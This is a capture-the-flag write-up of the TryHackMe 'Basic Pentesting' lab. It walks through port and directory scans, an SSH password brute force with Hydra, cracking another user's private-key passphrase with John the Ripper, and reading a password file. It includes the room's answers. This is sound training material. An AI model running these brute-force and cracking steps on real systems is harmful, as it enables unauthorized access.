
---
---

<div align="center">

# TryHackMe Basic Pentesting


<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/99c72676aab814b94e3bc350ba627b71.png" alt="THM BasicPentesting" width="220px" height="220px" style="margin-right: 85px;">
<img src="https://assets.tryhackme.com/img/THMlogo.png" alt="THM Logo" width="250px" height="150px" style="margin-bottom: 50px;">

<br>

ðŸ”— [Click here to access the TryHackMe room](https://tryhackme.com/r/room/basicpentestingjt)

<br>

</div>


## IP Addresses:

* ### Target/Victim Machine
	```
	10.10.109.136 (Ubuntu 16.04)
	```

* ### Attacker Machine
	```
	10.17.35.203 (Ubuntu 23.10)
	```


<br>

## Reconnaissance:

* ### Nmap Scan

	> nmap 10.10.109.136 -o nmap.log

	```
	PORT     STATE SERVICE     VERSION
	22/tcp   open  ssh         OpenSSH 7.2p2
	80/tcp   open  http        Apache httpd 2.4.18
	139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
	8080/tcp open  http        Apache Tomcat 9.0.7
	```

* ### Gobuster Scan

	> gobuster dir -u 10.10.109.136 -w /usr/share/wordlists/dirb/common.txt -o gobuster.log

	```
	/.htaccess            (Status: 403) [Size: 297]
	/.hta                 (Status: 403) [Size: 292]
	/.htpasswd            (Status: 403) [Size: 297]
	/development          (Status: 301) [Size: 320]
	/index.html           (Status: 200) [Size: 158]
	/server-status        (Status: 403) [Size: 301]
	```


<br>

## THM Questions:

* _Q1_: What is the name of the hidden directory on the web server(enter name without /)? <br> _A_: `development`


<br>

## Enumeration and Bruteforcing:

* ### Enum4linux scan

	> enum4linux -a 10.10.109.136 | tee enum4linux.log

	```
	S-1-22-1-1000 Unix User\kay (Local User)
	S-1-22-1-1001 Unix User\jan (Local User)
	```

* ### Using Hydra to enumerate jan's password

	> hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.109.136 | tee hydra.log

	```
	[22][ssh] host: 10.10.109.136   login: jan   password: armando
	```


<br>

## THM Questions:

* _Q2_: What is the username? <br> _A_: `jan`
* _Q3_: What is the password?  <br> _A_: `armando`


<br>

## Attempting login (user: jan)

> ssh jan@10.10.99.188

Login successful


<br>

## THM Questions:

* _Q4_: What service do you use to access the server(answer in abbreviation in all caps)? <br> _A_: `SSH`
* _Q5_: What is the name of the other user you found(all lower case)? <br> _A_: `kay`


<br>

## Finding PrivEsc vectors:

* ### linPEAS.sh scan

	Found user `kay's` `id_rsa` readable by user `jan` (logged in via ssh) in `/home/kay/.ssh/`


<br>

## Attempting login (user: kay)

> ssh -i kay_id_rsa kay@10.10.99.188

Login unsuccessful. id_rsa encrypted.


<br>

## Bruteforcing SSH key:

* ### Attempting id_rsa decryption using JohnTheRipper

	> python3 /opt/john/run/ssh2john.py kay_id_rsa > ssh2john.txt
	
	> /opt/john/run/john ssh2john.txt --wordlist=/opt/wordlists/rockyou.txt

	```
	beeswax          (kay_id_rsa)     
	```


<br>

## Attempting login (user: kay) (passphrase: beeswax)

> ssh -i kay_id_rsa kay@10.10.99.188

Login successful.


<br>

# Final Password

> cat /home/kay/pass.bak

```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```


<br>

# THM Questions:

* _Q6_: What is the final password you obtain? <br> _A_: `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`


<br>

---
---

<div align="center">

ðŸ’» Created by [Jayaditya Dev](https://tryhackme.com/p/jayadityadev)

ðŸš€ Find me on [GitHub](https://github.com/jayadityadev)

</div>

---
---
